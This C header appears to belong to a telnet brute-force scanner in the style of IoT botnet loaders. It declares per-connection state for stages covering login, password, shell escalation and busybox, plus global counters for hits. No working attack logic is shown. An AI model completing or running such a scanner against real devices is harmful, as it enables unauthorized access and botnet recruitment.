#pragma once

#define MAX_FDS 999999

#define ATOMIC_ADD(ptr,i) __sync_fetch_and_add((ptr),i)
#define ATOMIC_SUB(ptr,i) __sync_fetch_and_sub((ptr),i)
#define ATOMIC_INC(ptr) ATOMIC_ADD((ptr),1)
#define ATOMIC_DEC(ptr) ATOMIC_SUB((ptr),1)
#define ATOMIC_GET(ptr) ATOMIC_ADD((ptr),0)

int total, running, found, ran;

typedef struct telinfo_t {
    enum {
        BR_IACS,
        BR_USERNAME,
        BR_PASSWORD,
        BR_SEND_ENABLE,
        BR_SEND_LSHELL,
        BR_SEND_SYSTEM,
        BR_SEND_SH,
        BR_SEND_BUSYBOX,
        BR_WAITING_TOKEN_RESP
    } stage;

    char *user, *pass;
    char rdbuf[32];

    in_addr_t addr;
    int port, fd, tries;
} info_t;

info_t fd_info[MAX_FDS];

char s_string[32];
